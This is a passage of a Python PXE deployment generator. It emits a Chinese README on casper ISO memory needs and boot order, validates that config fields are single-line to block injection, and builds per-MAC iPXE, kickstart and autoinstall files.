        "OpsToolkit PXE 部署说明\n"
        "========================\n\n"
        "目标系统: " + c.os_type + " " + c.os_version + "\n"
        "PXE 服务端: " + c.server_ip + "\n"
        "本次使用的 ISO: " + (c.iso_url or "(未指定)") + "\n\n"
        "安装介质（必读）\n"
        "----------------\n"
        "Ubuntu 用 casper 的 url= 直接挂载 ISO，不需要手工解包 squashfs。\n"
        "把 ISO 放到服务端 /srv/opstk/iso/（应用发布在 http://<server>:8000/pxe/iso/）。\n"
        "旧的相对位置写法 `--- .../installer.squashfs` 会以\n"
        "  \"Unable to find a medium containing a live file system\" 失败。\n\n"
        "内存要求（必读）\n"
        "----------------\n"
        "casper 走 HTTP 取介质时，会把**整份 ISO 读进内存**（/cdrom 是 tmpfs），\n"
        "所以目标机内存要 >= ISO 大小 + 约 1.5 GB（装机环境本身的开销）。\n"
        "  本 ISO 大小: " + (str(iso_mb) + " MB  ->  建议目标机内存 >= " + str(ram_mb) + " MB"
                            if iso_mb else "(未知，请按 ISO 大小 + 1.5GB 估算)") + "\n"
        "这是 casper 的固有行为，不是本工具的写法问题：官方至今（LP #1660206，2017 年至今 New）\n"
        "仍不支持只经 HTTP 取 squashfs；想不占内存只能用 NFS 做介质，但 NFS 对防火墙不友好。\n"
        "注意：`url=` 这个内核参数 cloud-init 也会解析（cloud-config-url 的弃用别名），\n"
        "所以必须同时给出 cloud-config-url=，否则 cloud-init 会把整份 ISO 也当配置下载一遍\n"
        "（实测：3.66GB anon RSS 被 OOM 杀）。本配置已经带上了。\n\n"
        "引导顺序（必读）\n"
        "----------------\n"
        "目标机固件请设为【先硬盘、后网卡】，例如 PVE：\n"
        "  qm set <vmid> --boot \"order=scsi0;net0\"\n"
        "  - 空盘机器：硬盘引导失败 → 落到网卡 → PXE 装机\n"
        "  - 装好的机器：硬盘有 grub → 直接起系统，不会被 PXE 重装\n"
        "若设成只从网卡引导，装完自动重启后会再次 PXE 并**重装一遍**（反复抹盘）。\n\n"
        "内核控制台\n"
        "----------\n"
        "本次参数: " + (c.kernel_console or "(未设置)") + "\n"
        "无显示器的机器请接串口(115200)看装机过程与失败原因。\n\n"
        "部署步骤\n"
        "--------\n"
        "1. dnsmasq.conf 放到 /etc/dnsmasq.conf；\n"
        "   iPXE 固件(ipxe.efi/undionly.kpxe)放入 /srv/tftp/；systemctl restart dnsmasq\n"
        "   注意：Ubuntu 的 ipxe 包**不含 32 位 EFI 固件**（只有 ipxe.efi / snponly.efi /\n"
        "   undionly.kpxe / ipxe.pxe / ipxe.lkrn），而 dnsmasq 里为 32 位 UEFI(arch 6)\n"
        "   引用了 ipxe-i386.efi。若确有 32 位 UEFI 机器，需自行编译该固件放到 /srv/tftp/；\n"
        "   64 位 UEFI(arch 7/9) 与传统 BIOS 不受影响（已实测）。\n"
        "2. ISO 放入 /srv/opstk/iso/（不要解包）\n"
        "3. user-data(Ubuntu)/ks.cfg(RHEL) 与 boot.ipxe 放到 HTTP 目录，路径与 http_root 一致\n"
        "4. 目标机固件设为\"先硬盘、后网卡\"，然后开机\n"
        "注意: 已有 DHCP 时在交换机配置 IP Helper 指向本机\n"
    )


# 进入 _validate_lines() 时的豁免名单：
#   post_script —— 本来就是多行脚本，要整段塞进 late-command / %post；
#   admin_user  —— 它在每个汇点都已经过 _safe_username() 白名单**剔除**（不是拒绝），
#                  这是既定契约（见 tests 里对该行为的断言），再改判成"拒绝"会与之冲突。
# 其余标量字段都会被原样拼进 iPXE 脚本、dnsmasq.conf、autoinstall YAML 或 kickstart，
# 一律必须是单行 —— 见 _safe_line。
_LINE_GUARD_EXEMPT = frozenset({"post_script", "admin_user"})


def _validate_lines(c):
    """第 3 层统一兜底：把所有会被拼进生成物的标量字段逐个体检一遍。

    放在 generate_all() 入口而不是各个拼接点，是为了不漏汇点：
    http_root/kernel_path/initrd_path/iso_url/kernel_console 进 iPXE 与 dnsmasq，
    mirror 进 autoinstall 的 apt.uri 与 kickstart 的 `url --url="..."`，
    timezone/locale/keyboard 进 YAML —— 任何一处漏检，一个换行就能注入一整行。
    """
    from dataclasses import fields as _dc_fields
    for f in _dc_fields(c):
        if f.name in _LINE_GUARD_EXEMPT:
            continue
        val = getattr(c, f.name)
        if isinstance(val, str):
            _safe_line(val, f.name)


def generate_all(c, installs=None):
    _validate_lines(c)
    files = {}
    if (c.os_type or "").strip().lower() == "ubuntu":
        files["user-data"] = _ubuntu_user_data(c)
        files["meta-data"] = "local-hostname: " + _safe_hostname(c.hostname) + "\n"
    else:
        files["ks.cfg"] = _rhel_ks(c)
    files["boot.ipxe"] = _ipxe_menu(c)
    files["dnsmasq.conf"] = _dnsmasq(c, installs)
    files["README.txt"] = _readme(c)
    # 每台装机记录生成独立菜单与应答文件，使 hostname 生效
    for inst in installs or []:
        # D7 第 3 层：mac 会变成【文件名】与 dhcp-host 的值，必须是合法 MAC
        mac = _safe_mac(inst.get("mac"))
        if not mac:
            continue
        tag = _mac_tag(mac)
        hostname = _safe_hostname(inst.get("hostname"), "") or _safe_hostname(c.hostname)
        ic = replace(c, hostname=hostname)
        if (c.os_type or "").strip().lower() == "ubuntu":
            seed = c.http_root + "/user-data/" + tag + "/"
            files["user-data/" + tag + "/user-data"] = _ubuntu_user_data(ic)
            files["user-data/" + tag + "/meta-data"] = "local-hostname: " + hostname + "\n"
            answer = seed
        else:
            answer = c.http_root + "/ks/" + tag + "/ks.cfg"
            files["ks/" + tag + "/ks.cfg"] = _rhel_ks(ic)
        files["boot/" + tag + ".ipxe"] = _ipxe_menu(ic, mac=mac, answer_url=answer)
    return files
